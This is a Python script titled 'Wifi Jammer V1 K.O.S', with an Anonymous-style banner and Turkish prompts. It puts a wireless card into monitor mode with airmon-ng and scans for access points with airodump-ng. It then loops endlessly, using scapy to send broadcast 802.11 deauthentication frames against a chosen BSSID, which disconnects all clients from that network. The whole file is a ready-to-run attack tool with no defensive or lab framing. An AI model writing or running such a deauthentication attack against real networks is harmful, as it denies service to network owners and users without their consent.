from scapy.all import *
import subprocess 
from pip._vendor.colorama import Fore

subprocess.call('clear', shell=True) 

baner = ('''
  _   _  _                  _       _   
 | | | || |                | |     | |  
 | | | || |_ _ __   ___ ___| | ___ | |_ 
 | | |__   _| '_ \ / __/ _ \ |/ _ \| __|
 | |____| | | | | | (_|  __/ | (_) | |_ 
 |______|_| |_| |_|\___\___|_|\___/ \__|
 ''')                                       
                                        
print(Fore.LIGHTBLUE_EX+baner)

print(Fore.LIGHTBLUE_EX+'Wifi Jammer V1 K.O.S')

print(Fore.BLUE+'KnightsOfShadow #Anonymous')
print(Fore.CYAN+'instagram = @KnightL4ncelot')

subprocess.call('airmon-ng', shell=True) 

print('\n'*3)
print(Fore.GREEN+'yukarıdaki interface kısmını yazın')
networkCard = input(Fore.CYAN+" ┌─/"+Fore.LIGHTBLUE_EX+"Write Interface"+Fore.CYAN+"""/
 └──╼ """+Fore.LIGHTBLUE_EX+"=> ")

subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCard = '{}mon'.format(networkCard) 


try:
	subprocess.call('clear', shell=True) 
	print(Fore.YELLOW+'Taramadan cıkmak icin ctrl+c')
	subprocess.call('airodump-ng {}'.format(networkCard), shell=True) 
except KeyboardInterrupt: 
	print(''*3)


brdMac = 'ff:ff:ff:ff:ff:ff' 
BSSID = input(Fore.CYAN+" ┌─/"+Fore.LIGHTBLUE_EX+"Write bssid/mac"+Fore.CYAN+"""/
 └──╼ """+Fore.LIGHTBLUE_EX+"=> ") 
print(Fore.YELLOW+'saldırıyı durdurmak icin ctrl+c ye basılı tutun')
print(''*5)


try:
        
	while True:                
                
                
                
                	
		pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
		sendp(pkt, iface = networkCard, count = 8888, inter = .2) 
except KeyboardInterrupt: 
	print('Cleaning up...')
	subprocess.call('airmon-ng stop {}'.format(networkCard), shell=True) 
	subprocess.call('clear', shell=True) 
